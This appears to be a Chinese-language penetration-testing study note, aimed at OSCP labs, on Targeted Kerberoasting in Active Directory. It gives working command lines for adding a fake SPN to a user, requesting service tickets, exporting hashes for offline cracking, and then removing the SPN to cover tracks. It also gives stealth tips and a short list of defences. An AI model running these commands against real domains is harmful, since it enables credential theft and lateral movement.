# TargetedKerberoast

## 介绍

TargetedKerberoast（定向拷票），不是去找已经有SPN服务账号的票来kerberoast，而是你指定一个临时的账号成为SPN服务再去Kerberoast。

## TargetedKerberoast和Kerberoast区别

### 1）Kerberoast

前提：目标账号本来就是SPN（通常是服务账号）

你要做的事：向DC请求该SPN的TGS->离线爆破

### 2）TargetedKerberoast

前提：目标账号原来没有SPN服务（但是你能打开该账号SPN服务）

你要做的事：给它临时加一个SPN->请求TGS->离线爆破->再删掉SPN（还原痕迹）

## 为什么“加了SPN就能Kerberoast”？

因为Kerberos的逻辑是：

​	（1）SPN属于谁，KDC就用谁的密钥（=密码派生密钥）来加密服务的TGS

​	（2）任何域用户通常都能请求服务票据（TGS）

​	（3）于是你就能得到一份可以离线爆破的材料

## 成功的关键前提

你能修改目标用户对象的“ServicePrincipalName”属性，满足属性条件是：

​	1）GenericAll

​	2）GenericWrite

​	3）WriteProperty：ServicePricipalName（WriteSPN）

​	4）或者间接能得到：

​			(1)WriteDACl/(2)WriteOwner（先改ACL再给自己加写SPN权限）

## 什么时候它特别有用？

（1）你在BloodHound看到：你对某个高价值用户有GenericWrite/WriteSPN

（2）但该用户本身没有SPN，普通Kerberoast烤不到

（3）你又暂时找不到别的接管方式（比如改密码、shadow credentials等）

## 防守/加固的重点

1）减少谁能写别人对象属性尤其是（ServicePricipalName、msDS-KeyCredentialLink）

2）禁用RC4、强制AES（能显著增加离线爆破成本）

3）监控：

​	（1）用户对象ServicePricipalName被修改（尤其是用户突然出现SPN）

​	（2）随后出现异常的TGS请求

## 利用方式

### 0）格式

ServicePrincipalName 推荐写什么？
	SPN 格式是 服务类型/任意主机名，任意假的即可，关键是：

唯一（不能和域内已有 SPN 重复，否则 KDC 报错）。
	非真实主机（避免影响真实服务）。
	常见服务类型：http/、cifs/、HOST/、MSSQLSvc/、nonexistent/ 等。

OSCP 实战中最常用、最安全的假 SPN 示例（来自 PowerView 作者 harmj0y 和社区）：

```

'nonexistent/BLAHBLAH' （最经典，随意大写字母）
'fake/whatever123'
'http/fakehost.local'
'cifs/nosuchhost'
'ops/anythingunique'
```



### 1）targetedKerberoast

（1）工具下载

git clone https://github.com/ShutdownRepo/targetedKerberoast.git

（2）针对单个用户 （Targeted模式）

```
python3 targetedKerberoast.py --request-user jdoe -d corp.local -u user1 -p Passw0rd --only-abuse -o hash.txt --dc-ip 10.0.0.1
```

（3）对整个域执行Kerberoast（包括Targeted）

```
python3 targetedKerberoast.py -d corp.local -u user1 -p Passw0rd --dc-ip 10.0.0.1 -o hashes.txt -v
```

（4）使用NTLM：Hash（适用于已 dump 的哈希（如从 LSADump）。）

```
python3 targetedKerberoast.py -d corp.local -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -o hashes.txt -vv
```

（5）使用Kerberos票据（先用 Rubeus 或 Mimikatz 获取票据。）

```
export KRB5CCNAME=/path/to/ticket.ccache
python3 targetedKerberoast.py -d corp.local -k --no-pass -o krb_hashes.txt
```

（6）从用户列表文件批量操作（users.txt 内容：每行一个用户名，如 jdoe\nadmin2。）

```
python3 targetedKerberoast.py -U users.txt -d corp.local -u user1 -p Passw0rd --only-abuse -o targeted_hashes.txt -f john
```

（7）注意事项

权限检查：Targeted 模式依赖 ACL 滥用。先用 BloodHound 枚举权限（如 GenericWrite on user objects）。

检测规避：临时 SPN 操作可能触发警报，使用 -q 安静模式。OSCP 实验室中 AD 机器（如在 "goadv2.pdf" 提到的环境）常有弱配置，便于测试。

破解哈希：RC4 哈希弱，优先用 rockyou.txt 等词典。OSCP 中，破解后可用于横向移动或提权。

常见问题：

LDAP 连接失败：用 --use-ldaps 切换到安全通道，或检查防火墙。

无权限：切换到更高权限账户。

跨域：用 -D TARGET_DOMAIN 指定目标域。

（8）一些参数对比

用--only-abuse可以精准打击这些“隐藏”目标，减少无效请求，提高效率和隐蔽性。

| 参数         | 行为                      | 适合场景                           |
| ------------ | ------------------------- | ---------------------------------- |
| 无参数       | 传统+Targeted（全覆盖）   | 初次枚举，想拿所有可能哈希         |
| --only-abuse | 只Targeted（忽略已有SPN） | 精准攻击无SPN高权限账户，OPSEC更好 |
| --no-abuse   | 只传统（不添加SPN）       | 只想快速roast已知服务账户          |



### 2）PowerView（手动）

（1）检查目标是否已经有SPN

Get-DomainUser 'user' | Select ServicePricipalName

（2）临时设置SPN（滥用写权限添加假SPN）

Set-DomainObject -Identity 'user' -Set @{servicePricipalName='test/test'}

（3）请求TGS票，并导出哈希（进行Kerberoast）

方式一：

$User = Get-DomainUser 'xxxxxxxx'

$User | Get-DomainSPNTicket | fl

方式二：

Invoke-Kerberoast -Identity 'xxxxxxx' -OutputFormat Hashcat | Export-CSV hashes.txt

（4）清理现场

$User | Select ServicePricipalUser #先确认SPN

Set-DomainObject -Identity 'xxxx' -Clear servicePricipalName

